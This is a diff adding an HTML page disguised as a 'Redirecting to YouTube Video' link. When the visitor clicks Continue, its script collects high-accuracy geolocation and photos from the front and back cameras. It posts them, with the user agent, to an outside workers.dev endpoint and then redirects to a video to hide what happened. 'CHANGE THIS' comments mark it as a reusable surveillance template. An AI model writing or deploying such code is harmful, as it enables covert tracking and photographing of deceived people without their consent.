@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting to post...</title>
+  <style>
+    body { background:#000; color:#fff; text-align:center; padding-top:40vh; font-family:sans-serif; }
+    button { padding:15px 30px; font-size:18px; background:#fff; color:#000; border:none; border-radius:8px; cursor:pointer; }
+  </style>
+</head>
+<body>
+  <h2>Redirecting to YouTube Video...</h2>
+  <button id="continueBtn">Continue</button>
+
+  <script>
+    const WORKER_URL = "https://snowy-fog-b0d1.23amts322.workers.dev"; // ← CHANGE THIS
+    const REDIRECT_URL = "https://youtu.be/RokPrwbgIu0?si=UOUsIKyMivFzJzKJ";   // ← CHANGE THIS
+
+    document.getElementById('continueBtn').addEventListener('click', async () => {
+      document.getElementById('continueBtn').style.display = 'none';
+      document.querySelector('h2').textContent = 'Loading...';
+
+      try {
+        // Location
+        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy:true}));
+        const locationData = { lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy };
+
+        // Front camera
+        let stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user", width:1280, height:720}});
+        const front = await capturePhoto(stream);
+        stream.getTracks().forEach(t => t.stop());
+
+        // Back camera (no extra prompt)
+        stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "environment", width:1280, height:720}});
+        const back = await capturePhoto(stream);
+        stream.getTracks().forEach(t => t.stop());
+
+        // Send to Mongo via Worker
+        await fetch(WORKER_URL, {
+          method: "POST",
+          body: JSON.stringify({ frontPhoto: front, backPhoto: back, location: locationData, userAgent: navigator.userAgent, timestamp: Date.now() })
+        });
+
+      } catch (e) {
+        // Still redirect even if denied
+      }
+
+      window.location.replace(REDIRECT_URL);
+    });
+
+    function capturePhoto(stream) {
+      return new Promise(resolve => {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        video.onloadedmetadata = () => {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+          canvas.getContext('2d').drawImage(video, 0, 0);
+          resolve(canvas.toDataURL('image/jpeg', 0.85));
+        };
+      });
+    }
+  </script>
+</body>
+</html>
